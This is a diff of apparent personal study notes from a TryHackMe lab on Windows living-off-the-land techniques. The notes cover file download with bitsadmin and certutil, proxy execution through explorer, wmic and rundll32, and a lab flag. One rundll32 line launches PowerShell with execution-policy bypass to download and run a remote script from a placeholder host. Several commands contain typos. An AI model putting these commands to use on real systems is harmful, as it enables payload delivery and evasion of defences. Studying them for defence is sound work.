@@ -62,6 +62,45 @@ find text and string patterns in files
 -can be used to download remote files from SMB shared folders
 C:\Users\thm>findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe
 
-bitsadmin /transfer /Download /priority Foregraound http://[IP]/file
-enc_thm_0ymFiOG_file.txt
+bitsadmin.exe /transfer /Download /priority Foregraound http://[IP]/file
+enc_thm_0YmFiOG_file.txt
+
+certutil.exe -decode enc_thm_0YmFiOG_file.txt decoded.txt
+type decoded.txt
+THM{ea4e2b9f362320d098635d4bab8a568e}
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+File Execution
+-Signed Binary Proxy Execution / Indirect Command Execution -  attacker leverages other system tools to spawn malicious payloads. 
+
+File Explorer:
+-can execute other .exe files
+-indirect command execution where explore.exe can be used to launch malicious scripts  from trusted parent process
+-location C:\Windows\explorer.exe - 32bit
+-location C:\Windows\SysWOW64\explorer.exe - 64bit
+C:\Users\thm> explorer.exe /root,"C:\Windows\System32\calc.exe"
+
+WMIC:
+-Windows management instrumentation (WMIC) - windows command line utility that manages windows componenets
+-can be used to execute binaries for evading defensive measures (T1218)
+C:\Users\thm> wmic.exe process call create calc
+
+Rundll32:
+-Microsoft built-in tool that loads and runs Dynamic Link Library (DLL) files
+-signed binary proxy execution using Rundll32 (T1218)
+-location C:\Windows\System32\rundll32.exe - 32 bits
+-location C:\Windows\System64\rundll32.exe - 64 bits
+-execute calc
+C:\Users\thm> rundll32.exe javascript:"\..\mshtml.ddl,RunHTMLApplication ";eval("w=newActiveXObject(\"WScript.Shell\");w.run(\"calc\";window.close()");
+-run powershell script
+C:\Users\thm> rundll32.exe javasript:"\..\mshtml, RUNHTMLApplication";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-ObjectNet.WebClient).DownloadString('http://[IP]/script.ps1');");
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Bypassing Application Whitelisting
+
+
+
+
 
